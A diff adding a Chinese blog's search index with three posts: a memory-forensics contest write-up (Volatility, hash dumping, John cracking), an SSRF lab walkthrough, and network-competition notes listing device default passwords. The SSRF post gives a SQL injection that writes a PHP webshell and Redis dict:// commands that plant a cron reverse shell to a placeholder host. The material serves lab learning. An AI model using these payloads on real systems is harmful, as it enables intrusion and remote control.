@@ -1,0 +1,1385 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>内存取证</title>
+    <url>/posts/14937.html</url>
+    <content><![CDATA[<meta name="referrer" content="no-referrer">
+
+<h2 id="任务二：内存文件取证"><a href="#任务二：内存文件取证" class="headerlink" title="任务二：内存文件取证"></a>任务二：内存文件取证</h2><table>
+<thead>
+<tr>
+<th>序号</th>
+<th>任务描述</th>
+<th>答案</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>从内存中获取到用户admin的密码并且破解密码，以Flag{admin,password}形式提交(密码为6位)；</td>
+<td></td>
+</tr>
+<tr>
+<td>2</td>
+<td>获取当前系统ip地址及主机名，以Flag{ip:主机名}形式提交；</td>
+<td></td>
+</tr>
+<tr>
+<td>3</td>
+<td>当前系统中存在的挖矿进程，请获取指向的矿池地址，以Flag{ip}形式提 交；</td>
+<td></td>
+</tr>
+<tr>
+<td>4</td>
+<td>恶意进程在系统中注册了服务，请将服务名以Flag{服务名}形式提交。</td>
+<td></td>
+</tr>
+<tr>
+<td>5</td>
+<td>从内存文件中获取黑客进入系统后下载的flag文件，将文件中的值作为Flag 值提交；</td>
+<td></td>
+</tr>
+</tbody></table>
+<p>分析镜像系统</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./volatility_2.6_lin64_standalone --file=neicun（内存取证文件）.vmem imageinfo</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619150423058-776766353.png" alt="image-20240619150424753"></p>
+<p>一般用第一个作为系统版本</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619150437853-1464101184.png" alt="image-20240619150439757"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./volatility_2.6_lin64_standalone --file=neicun（内存取证文件）.vmem -- profile=Win7SP1x64 hashdump 查看用户和密码(不是明文)一般破解不出来</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619150504638-1392824465.png" alt="image-20240619150506064"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">尝试下破解密码</span><br><span class="line">ctrl+shirt+t快捷打开新窗口</span><br><span class="line">vi 1.txt</span><br><span class="line">将密码写入wq保存</span><br><span class="line">cat 1.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619150517469-2058002278.png" alt="image-20240619150519326"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">破解密码</span><br><span class="line">john 1.txt</span><br><span class="line">自动分析密码类型，使用默认字典，</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619150531612-260363863.png" alt="image-20240619150533389"></p>
+<p>kali字典位置 cd &#x2F;usr&#x2F;share&#x2F;wordlists</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619150557109-1014596405.png" alt="image-20240619150558827"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用默认字典破解</span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt --format=LM 1.txt</span><br><span class="line"> windows使用--format=NTLM</span><br><span class="line">显示没成功</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619150613603-1910517122.png" alt="image-20240619150615339"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./volatility_2.6_lin64_standalone --file=neicun（内存取证文件）.vmem --</span><br><span class="line"> profile=Win7SP1x64 lsadump</span><br><span class="line">使用lsadump</span><br><span class="line">所以密码就是H8d*or</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619150632837-1280567653.png" alt="image-20240619150634522"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">看到开放端口</span><br><span class="line">./volatility_2.6_lin64_standalone --file=neicun（内存取证文件）.vmem --</span><br><span class="line"> profile=Win7SP1x64 netscan</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619150654722-69234278.png" alt="image-20240619150656428"></p>
+<p>所以本机IP就是192.168.232.129</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619150711549-689200065.png" alt="image-20240619150713230"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看注册表内容</span><br><span class="line">./volatility_2.6_lin64_standalone --file=neicun（内存取证文件）.vmem --</span><br><span class="line"> profile=Win7SP1x64 hivelist</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619150734928-1348737340.png" alt="image-20240619150736509"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如何查看注册表中有哪些表项-o 指定虚拟地址Virtual printkey</span><br><span class="line"> ./volatility_2.6_lin64_standalone --file=neicun（内存取证文件）.vmem --</span><br><span class="line"> profile=Win7SP1x64 -o 0xfffff8a000024010 printkey</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619150755476-639221767.png" alt="image-20240619150757222"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-K &quot;指定表&quot;  K是大写</span><br><span class="line">./volatility_2.6_lin64_standalone --file=neicun（内存取证文件）.vmem --</span><br><span class="line"> profile=Win7SP1x64 -o 0xfffff8a000024010 printkey -K &quot;ControlSet001&quot;</span><br><span class="line">有用的是Control</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619150808469-1657629284.png" alt="image-20240619150810206"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">加反斜杠\ 进入下一层</span><br><span class="line">./volatility_2.6_lin64_standalone --file=neicun（内存取证文件）.vmem --</span><br><span class="line"> profile=Win7SP1x64 -o 0xfffff8a000024010 printkey -K &quot;ControlSet001\Control&quot;</span><br><span class="line">有用的是ComputerName</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619150823925-378209424.png" alt="image-20240619150825664"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./volatility_2.6_lin64_standalone --file=neicun（内存取证文件）.vmem --</span><br><span class="line"> profile=Win7SP1x64 -o 0xfffff8a000024010 printkey -K </span><br><span class="line">&quot;ControlSet001\Control\ComputerName&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619150837705-35131151.png" alt="image-20240619150839463"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./volatility_2.6_lin64_standalone --file=neicun（内存取证文件）.vmem --</span><br><span class="line"> profile=Win7SP1x64 -o 0xfffff8a000024010 printkey -K </span><br><span class="line">&quot;ControlSet001\Control\ComputerName\ComputerName&quot;</span><br><span class="line">用户名就是CXKKA2ZCLKN</span><br><span class="line">这个路径是固定的，记一下</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619150902065-751198085.png" alt="image-20240619150903832"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看连接次数较多，程序名比较诡异的，可能就是向外连接的挖矿地址</span><br><span class="line">./volatility_2.6_lin64_standalone --file=neicun（内存取证文件）.vmem --</span><br><span class="line"> profile=Win7SP1x64 netscan</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619150918780-282749939.png" alt="image-20240619150920511"></p>
+<p>挖矿地址就是51.254.84.37</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619150929451-2134456690.png" alt="image-20240619150931161"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> ./volatility_2.6_lin64_standalone --file=neicun（内存取证文件）.vmem --</span><br><span class="line"> profile=Win7SP1x64 pslist</span><br><span class="line"> pslist可以查看内存中所有的进程</span><br><span class="line">等同于windows下tasklist</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619150945946-1956630255.png" alt="image-20240619150947590"></p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619150954886-168856547.png" alt="image-20240619150956640"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">windows下关闭进程</span><br><span class="line">taskkill /pid 3988</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619151010462-126443852.png" alt="image-20240619151012016"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-p 指定pid</span><br><span class="line"> ./volatility_2.6_lin64_standalone --file=neicun（内存取证文件）.vmem --</span><br><span class="line"> profile=Win7SP1x64 pslist -p 1716</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619151025371-250007496.png" alt="image-20240619151026920"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./volatility_2.6_lin64_standalone --file=neicun（内存取证文件）.vmem --</span><br><span class="line">profile=Win7SP1x64 pstree</span><br><span class="line">pstree 可以树状显示进程</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619151038024-245141440.png" alt="image-20240619151039711"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">explorer 就是windows文件资源管理器</span><br><span class="line">./volatility_2.6_lin64_standalone --file=neicun（内存取证文件）.vmem --</span><br><span class="line"> profile=Win7SP1x64 svcscan</span><br><span class="line"> svcscan可以查看所有服务</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619151055357-1985636528.png" alt="image-20240619151057012"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./volatility_2.6_lin64_standalone --file=neicun（内存取证文件）.vmem --</span><br><span class="line"> profile=Win7SP1x64 filescan</span><br><span class="line"> filescan查看内存中所有文件</span><br><span class="line">./volatility_2.6_lin64_standalone --file=neicun（内存取证文件）.vmem --</span><br><span class="line"> profile=Win7SP1x64 filescan | grep -i &quot;txt\|png\|jpg\|flag\|desktop\|gif&quot;-i 不区分大小写，</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619151109423-855338997.png" alt="image-20240619151111037"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./volatility_2.6_lin64_standalone --file=neicun（内存取证文件）.vmem --</span><br><span class="line"> profile=Win7SP1x64 dumpfiles -Q 0x000000007f810a70 -D ./-Q 进程号 -D 指定导出位置 ./当前目录</span><br><span class="line">再将flag.txt导出</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619151121602-2086704710.png" alt="image-20240619151123498"></p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619151130082-2062314983.png" alt="image-20240619151131946"></p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619151139321-882868819.png" alt="image-20240619151141107"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将两个文件复制到物理机，使用010打开，分析很明显是两张图片能组成一张</span><br><span class="line">用末尾图片复制到开头图片00位置保存</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619151208960-822247532.png" alt="image-20240619151210770"></p>
+]]></content>
+      <categories>
+        <category>writeup</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>SSRF打进内网</title>
+    <url>/posts/27465.html</url>
+    <content><![CDATA[<meta name="referrer" content="no-referrer">
+
+<h1 id="SSRF打穿内网"><a href="#SSRF打穿内网" class="headerlink" title="SSRF打穿内网"></a>SSRF打穿内网</h1><h3 id="靶场拓扑图"><a href="#靶场拓扑图" class="headerlink" title="靶场拓扑图"></a>靶场拓扑图</h3><p><img src="https://img2023.cnblogs.com/blog/3373819/202408/3373819-20240819193858598-1288943779.png" alt="image-20240819193857369"></p>
+<h3 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h3><p>docker：<a href="https://github.com/Duoduo-chino">https://github.com/Duoduo-chino</a></p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202408/3373819-20240820213922574-1766315052.png" alt="image-20240819202114076"></p>
+<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p><strong>服务器端请求伪造</strong></p>
+<p>一般SSRF目标是外网无法访问的内部系统，形成原因一般是因为服务端提供了从其他服务器应用提供的应用获取数据的功能且没有多对目标地址做过滤与限制</p>
+<p>例如：攻击者操控服务端从指定URL地址获取网页文本内容，加载指定地址的图片，利用的是服务端的请求伪造。</p>
+<p>SSRF利用存在缺陷的WEB应用作为代理攻击远程和本地的服务器</p>
+<p>主要攻击：</p>
+<ul>
+<li>利用file协议读取本地文件</li>
+<li>对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息</li>
+<li>对内网WEB应用进行指纹识别，主要是使用HTTP GET请求就可以实现的攻击(比如struts2、SQli等)，识别企业内部资产信息</li>
+</ul>
+<h4 id="漏洞相关函数"><a href="#漏洞相关函数" class="headerlink" title="漏洞相关函数"></a>漏洞相关函数</h4><p><strong>file_get_contents()</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>**file_get_contents()**函数从用户指定的url获取内容，然后指定一个文件名进行保存，并展示给用户。file_put_content函数把一个字符串写入文件中。</p>
+</blockquote>
+<p><strong>fsockopen()</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span>(<span class="params"><span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$link</span></span>) </span>&#123; </span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="title function_ invoke__">intval</span>(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);   </span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (error number <span class="subst">$errno</span>) \n&quot;</span>; </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;GET <span class="subst">$link</span> HTTP/1.1\r\n&quot;</span>; </span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>; </span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>; </span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;\r\n&quot;</span>; </span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>); </span><br><span class="line">        <span class="variable">$contents</span>=<span class="string">&#x27;&#x27;</span>; </span><br><span class="line">        <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123; </span><br><span class="line">            <span class="variable">$contents</span>.= <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">1024</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$contents</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>**fsockopen()**函数实现对用户指定url数据的获取，该函数使用socket（端口）跟服务器建立tcp连接，传输数据。</p>
+</blockquote>
+<p><strong>curl_exec()</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$link</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="variable">$curlobj</span> = <span class="title function_ invoke__">curl_init</span>();<span class="comment">// 创建新的 cURL 资源</span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);<span class="comment">// 设置 URL 和相应的选项</span></span><br><span class="line">    <span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>);<span class="comment">// 抓取 URL 并把它传递给浏览器</span></span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curlobj</span>);<span class="comment">// 关闭 cURL 资源，并且释放系统资源</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&#x27;./curled/&#x27;</span>.<span class="title function_ invoke__">rand</span>().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$result</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>**curl_exec()**函数用于执行指定的cURL会话</p>
+</blockquote>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.一般情况下PHP不会开启fopen的gopher wrapper</span><br><span class="line">2.file_get_contents的gopher协议不能URL编码</span><br><span class="line">3.file_get_contents关于Gopher的302跳转会出现bug，导致利用失败</span><br><span class="line">4.curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用</span><br><span class="line">5.curl_exec() //默认不跟踪跳转，</span><br><span class="line">6.file_get_contents() // file_get_contents支持php://input协议</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h4 id="利用协议"><a href="#利用协议" class="headerlink" title="利用协议"></a>利用协议</h4><ol>
+<li>file：在有回显的情况下，利用 file 协议可以读取任意内容</li>
+<li>dict：泄露安装软件版本信息，查看端口，操作内网redis服务等</li>
+<li>gopher：gopher支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</li>
+<li>http&#x2F;s：探测内网主机存活</li>
+</ol>
+<p><strong>Takit用redis扫</strong></p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202408/3373819-20240820213924229-1021137818.png" alt="image-20240819204306689"></p>
+<h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p>输入快照的网站</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202408/3373819-20240819210928461-132506860.png" alt="image-20240819210927456"></p>
+<p>file协议进行测试，<code>file:///etc/passwd</code></p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202408/3373819-20240820213924559-1900718410.png" alt="image-20240819232648123"></p>
+<p>很显然这里存在SSRF漏洞</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>为进一步内网渗透，尝试读取主机IP文件，<code>file:///etc/hosts</code></p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202408/3373819-20240819232830841-1210323998.png" alt="image-20240819232829595"></p>
+<p>可以看到内网IP是172.72.23.21，确定了内网网段，下一步搜集内网主机</p>
+<p><strong>dict协议</strong>探测内网在线主机及开放端口</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202408/3373819-20240820213926993-1643463585.png" alt="image-20240819234346838"></p>
+<p>1-255、常见端口</p>
+<p>需要字典后台私信即可</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202408/3373819-20240819234405677-1302878209.png" alt="image-20240819234404440"></p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202408/3373819-20240819234414557-115631866.png" alt="image-20240819234413262"></p>
+<p>从响应报文可以分析到内网资产</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">172.72.23.21 - 80</span><br><span class="line">172.72.23.22 - 80</span><br><span class="line">172.72.23.23 - 80</span><br><span class="line">172.72.23.24 - 80</span><br><span class="line">172.72.23.25 - 80</span><br><span class="line">172.72.23.26 - 8080</span><br><span class="line">172.72.23.27 - 6379</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202408/3373819-20240820213924019-401485036.png" alt="image-20240820002714453"></p>
+<p><strong>http协议</strong>，好多都是80，8080，进一步使用http协议查看</p>
+<p>正常应该是攻破一台，然后使用VPN连接内网，进一步内网渗透</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202408/3373819-20240820213920898-1642559825.png" alt="image-20240820003457872"></p>
+<h2 id="0x01-代码执行"><a href="#0x01-代码执行" class="headerlink" title="0x01 代码执行"></a>0x01 代码执行</h2><p>http协议结合burp目录扫描，发现存在phpinfo.php与shell.php</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202408/3373819-20240820213924242-1061911128.png" alt="image-20240820024122610"></p>
+<p>这里注意的是url中，burp会进行一次解码，所以payload要进行二次编码</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202408/3373819-20240820024722063-300671323.png" alt="image-20240820024720205"></p>
+<h2 id="0x02-SQL注入"><a href="#0x02-SQL注入" class="headerlink" title="0x02 SQL注入"></a>0x02 SQL注入</h2><p><img src="https://img2023.cnblogs.com/blog/3373819/202408/3373819-20240820213933408-273006109.png" alt="image-20240820025117440"></p>
+<p>简单的联合注入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://172.72.23.23/?id=-1&#x27;/**/union/**/select/**/1,2,3,group_concat(content)/**/from/**/flag_is_here%2523</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202408/3373819-20240820035147144-204710552.png" alt="image-20240820035142004"></p>
+<p>尝试sql进行写入文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://172.72.23.23/?id=1&#x27;%2520union%2520select%25201,2,3,&#x27;&lt;?php%2520system($_GET[1]);?&gt;&#x27;%2520INTO%2520DUMPFILE%2520&#x27;/var/www/html/cmd.php&#x27;%2523</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202408/3373819-20240820213921686-1669711960.png" alt="image-20240820054937570"></p>
+<p>执行</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202408/3373819-20240820213926063-1598365600.png" alt="image-20240820055000406"></p>
+<h2 id="0x03-命令执行"><a href="#0x03-命令执行" class="headerlink" title="0x03 命令执行"></a>0x03 命令执行</h2><p>这个是post请求，这里我们用到<code>gopher协议</code>，格式如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_&lt;TCP数据流&gt;</span><br></pre></td></tr></table></figure>
+
+<p>先将IP&#x3D;界面抓包</p>
+<p>删除Accept-Encoding: gzip, deflate这行</p>
+<p>两次url转换</p>
+<p>再到url&#x3D;界面抓包修改</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202408/3373819-20240820213925738-496631720.png" alt="image-20240820062507238"></p>
+<h2 id="0x04-XML实体注入"><a href="#0x04-XML实体注入" class="headerlink" title="0x04 XML实体注入"></a>0x04 XML实体注入</h2><p>原理和gopher协议相同，半天找不出错误点在哪，后期再补吧</p>
+<h2 id="0x05-Redis"><a href="#0x05-Redis" class="headerlink" title="0x05 Redis"></a>0x05 Redis</h2><ul>
+<li><p>向Web服务器中写入WebShell</p>
+</li>
+<li><p>写SSH Key</p>
+</li>
+<li><p>写定时任务反弹shell</p>
+</li>
+</ul>
+<p>利用dict协议攻击未授权redis服务</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dict://x.x.x.x:6379/&lt;Redis 命令&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>dict://172.72.23.27:6379/info</code></p>
+<p>可见是存在未授权的</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202408/3373819-20240820213924934-924814620.png" alt="image-20240820073030344"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 清空 key</span><br><span class="line">dict://172.72.23.27:6379/flushall</span><br><span class="line"></span><br><span class="line"># 设置要操作的路径为定时任务目录</span><br><span class="line">dict://172.72.23.27:6379/config set dir /var/spool/cron/</span><br><span class="line"></span><br><span class="line"># 在定时任务目录下创建 root 的定时任务文件</span><br><span class="line">dict://172.72.23.27:6379/config set dbfilename root</span><br><span class="line"></span><br><span class="line"># 写入 Bash 反弹 shell 的 payload</span><br><span class="line">dict://172.72.23.27:6379/set x &quot;\n* * * * * /bin/bash -i &gt;%26 /dev/tcp/x.x.x.x/2333 0&gt;%261\n&quot;</span><br><span class="line"></span><br><span class="line"># 保存上述操作</span><br><span class="line">dict://172.72.23.27:6379/save</span><br></pre></td></tr></table></figure>
+
+<p>以为需要在bp进行一次url编码呢，正准备搞结果弹出来了，看&#x2F;etc&#x2F;hosts是27的机器，逐步按照以上步骤，用bp发包防止浏览器给url打乱编码</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202408/3373819-20240820080312371-149791234.png" alt="image-20240820080310109"></p>
+]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>信安管评一阶段</title>
+    <url>/posts/2590.html</url>
+    <content><![CDATA[<meta name="referrer" content="no-referrer">
+
+<h2 id="赛前准备"><a href="#赛前准备" class="headerlink" title="赛前准备"></a>赛前准备</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 梳理网线</span><br><span class="line">2. 配置BC、WFA、FW设备IP地址</span><br><span class="line">3. 连接设备检查是否能正常登录</span><br><span class="line">4. 查看拓扑图，子网划分表，vlan划分进行连线思路整理，细心耐心整理连接</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="center">型号</th>
+<th align="center">端口</th>
+<th align="center">登录</th>
+<th align="center">用户名</th>
+<th align="center">密码</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">DCFW-1800E-N3002</td>
+<td align="center">eth0</td>
+<td align="center"><a href="https://192.168.1.1/">https://192.168.1.1</a></td>
+<td align="center">admin</td>
+<td align="center">admin</td>
+</tr>
+<tr>
+<td align="center">DCFW-1800E-WAF-P</td>
+<td align="center">G0-G5</td>
+<td align="center"><a href="https://192.168.254.1/">https://192.168.254.1</a></td>
+<td align="center">admin</td>
+<td align="center">yunke1234!</td>
+</tr>
+<tr>
+<td align="center">DCBC-NetLog</td>
+<td align="center">eth0</td>
+<td align="center"><a href="https://192.168.0.1:9090/">https://192.168.0.1:9090</a></td>
+<td align="center">admin</td>
+<td align="center">admin*PWD</td>
+</tr>
+<tr>
+<td align="center">DCWS-6028P</td>
+<td align="center"></td>
+<td align="center">console</td>
+<td align="center"></td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">CS6200-28X-Pro</td>
+<td align="center"></td>
+<td align="center">console</td>
+<td align="center"></td>
+<td align="center"></td>
+</tr>
+</tbody></table>
+<p>必须熟记三个web网站及对应型号，节省一阶段时间</p>
+<h2 id="任务一"><a href="#任务一" class="headerlink" title="任务一"></a>任务一</h2><p>使用笔记本模板配置最快速 </p>
+<p>连接AP，FW都为trunk  </p>
+<p>连接AP时设置native vlan</p>
+<h3 id="FW"><a href="#FW" class="headerlink" title="FW"></a>FW</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://192.168.1.1</span><br><span class="line">admin</span><br><span class="line">admin</span><br></pre></td></tr></table></figure>
+
+<p><strong>策略放行</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rule id 1</span><br><span class="line">   action permit</span><br><span class="line">   src-addr any</span><br><span class="line">   dst-addr any</span><br><span class="line">   service any</span><br><span class="line">zone trust1</span><br></pre></td></tr></table></figure>
+
+<p><strong>配置IP</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ipv6 enabel</span><br><span class="line">interface e0/1</span><br><span class="line">manage ping </span><br><span class="line">zone trust</span><br><span class="line">ip ad 192.168.0.1/24</span><br></pre></td></tr></table></figure>
+
